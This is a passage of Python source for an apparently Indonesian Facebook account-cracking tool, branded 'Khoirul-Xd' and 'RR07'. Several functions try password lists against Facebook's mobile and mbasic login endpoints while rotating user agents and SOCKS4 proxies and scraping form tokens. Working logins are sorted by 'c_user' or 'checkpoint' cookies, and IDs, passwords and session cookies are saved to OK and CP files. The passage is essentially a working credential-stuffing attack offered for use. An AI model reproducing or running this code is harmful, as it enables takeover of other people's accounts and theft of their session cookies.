nvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,Kues={'Kue': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='ARIP-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1703501188&hrc=1&wtsid=rdr_033qmBEAwHwueyH7Q&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1703501188&hrc=1&wtsid=rdr_033qmBEAwHwueyH7Q&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1132078350149238&auth_token=cc90dbbd519ef9abbb3cccc56d77fd56&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&refsrc=deprecated&app_id=1132078350149238&cancel=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──> UGENT : {U}{ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──>  KUKIS : {hh}{kuki}{N}\n└──> UGENT : {u}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE-MOBILE ]-----------------#
def crack2(idf,pwv):
	global loop,ok,cp
	pers = loop*100/len(id2)
	fff = '%'
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
	sys.stdout.flush()
	bro = random.choice(["com.google.android.captiveportallogin","com.chrome.beta","com.kiwibrowser.browser","org.gnu.icecat","com.cookiegames.smartcookie","com.facebook.lite","com.instagram.barcelona","com.instagram.boomerang","com.mx.browser","com.opera.browser"])
	ua = random.choice(ugen)
	get = geturlm()
	url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
	post = posturlm()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get(get)
			data = {
    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
    "try_number": re.search('name="try_number" value="(.*?)"', str(link.text)).group(1),
    "unrecognized_tries": re.search(
        'name="unrecognized_tries" value="(.*?)"', str(link.text)
    ).group(1),
    "email": username,
    "prefill_contact_point": "",
    "prefill_source": "",
    "prefill_type": "",
    "first_prefill_source": "",
    "first_prefill_type": "",
    "had_cp_prefilled": "true",
    "had_password_prefilled": "false",
    "is_smart_lock": "false",
    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
    "encpass": "#PWD_BROWSER:0:{}:{}".format(
        re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1), pw
    ),
    "fb_dtsg": "",
    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
    "__dyn": "",
    "__csr": "",
    "__req": random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
    "__a": "",
    "__user": 0,
}

			yusup = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			head = {
    "Host": url,
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    # 'cookie': 'datr=5xlCZcUZoC20eHcjP1RKaq9x; sb=5xlCZQeARAewyul8AgVXu5tI; m_pixel_ratio=1; wd=1348x945; fr=021vFCCZWdLSjl1ME..BlQhnn.ND.AAA.0.0.BlSsdE.AWUz3aQNXS4',
    "dpr": f"{str(rr(1,5))}",
    "origin": f"https://"+url,
    "referer": get,
    "sec-ch-prefers-color-scheme": "light",
    "sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
    "sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-model": '""',
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": ua,
    "viewport-width": f"{str(rr(300,999))}",
    "x-asbd-id": "129477",
    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
    "x-requested-with": bro,
    "x-response-format": "JSONStream",
}
			ses.post(post,headers=head,data=data,cookies={'cookie': yusup},allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──> UGENT : {U}{ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──>  KUKIS : {hh}{kuki}{N}\n└──> UGENT : {u}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	#-------------------[ METODE-B-API ]-----------------#
def rr071(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{x}[{bo}RR07v1{x}] | {P}{b}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1703501188&hrc=1&wtsid=rdr_033qmBEAwHwueyH7Q&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1703501188&hrc=1&wtsid=rdr_033qmBEAwHwueyH7Q&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1132078350149238&auth_token=cc90dbbd519ef9abbb3cccc56d77fd56&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&refsrc=deprecated&app_id=1132078350149238&cancel=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{x}[{K2}CP{x}] : {K2}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{x}[{H2}OK{x}] : {H2}{idf}|{pw}\n{H}{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#------------------[ METODE-MBASIC-2 ]-------------------#
def rr072(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{x}[{bo}RR07v2{x}] | {P}{b}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link= ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			cokz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			cokz+=' m_pixel_ratio=2.625; wd=412x756'
			head={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not)A;Brand";v="98", "Chromium";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.7,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'com.facebook.katana','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%